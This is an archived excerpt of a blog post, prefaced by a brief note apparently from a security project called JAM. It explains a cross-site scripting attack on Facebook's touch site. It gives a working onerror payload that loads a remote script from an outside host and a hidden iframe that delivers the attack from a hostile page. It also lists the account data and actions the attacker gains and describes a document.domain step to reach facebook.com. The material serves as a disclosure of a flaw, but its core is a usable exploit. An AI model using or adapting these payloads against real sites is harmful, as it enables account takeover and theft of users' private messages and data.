Retrieved 2014-12-12 from http://m-austin.com/blog/?p=19

This is an attack that relies on client side editing of an HTML page.
Therefore, it's hard to see where JAM could get a foothold to mitigate
the problem.

Text below is from http://m-austin.com/blog/?p=19:

The Code
Because the content of our payload is set with "innerHTML" we can't just
plug in a <script> tag and expect it to work, but other events will
fire. In this example we simply make an image with a bad src and an
onerror handle. Now we can load a remote script to do the work for us:

onerror="$('header').appendChild(document.createElement('script')).src='http://example.com/fb/fb.js'"

Because facebook does not bust out of this frame we can simply place the
xss in a hidden iframe on an evil site.

<iframe src="http://touch.facebook.com/#http://example.com/xss.php" style="display:none"></iframe>

Now when a user views the evil site the hacker has full control over
touch.facebook.com. The attacker can:
  Know who you are
  See your photos
  Read messages
  Read sent messages
  Send messages
  Read most private data (e-mail, phone, friends)
  Add friends
  Post comments
But lets assume that's not enough. What if we need access to
facebook.com for some reason. Maybe we want to take over a facebook app
owned by the user. For this we are going to use: "document.domain".
Because http://touch.facebook.com is a sub-domain of http://facebook.com
in our javascript/xss we can define document.domain on touch to be
facebook.com. This will allow us to talk directly to facebook.com

